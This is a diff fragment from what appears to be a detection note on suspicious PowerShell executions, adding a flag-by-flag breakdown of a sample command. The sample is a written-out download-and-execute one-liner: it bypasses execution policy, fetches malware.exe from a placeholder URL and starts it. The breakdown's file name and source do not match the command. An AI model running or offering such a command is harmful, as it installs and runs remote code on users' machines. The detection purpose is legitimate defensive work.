@@ -70,3 +70,9 @@ Regex Pattern: Monitor PowerShell Executions with Suspicious Parameters:
 powershell -ExecutionPolicy Bypass -Noprofile -Command "invoke-Webrequest -URL 'http here' -Outfile 'C:\Users\Public\malware.exe'; Start-Process 'C\Users\Public\malware.exe'
 
 ```
+
+### Full Command Breakdown:
+-ExecutionPolicy Bypass: Temporarily bypasses the PowerShell script execution policy to allow the script to run without restriction.
+-NoProfile: Prevents loading of the user profile, which speeds up the execution and avoids potential conflicts.
+- Invoke-WebRequest: Downloads the payload (payload.exe) from the provided GitHub URL.
+- Start-Process: Runs the downloaded malware.exe file.
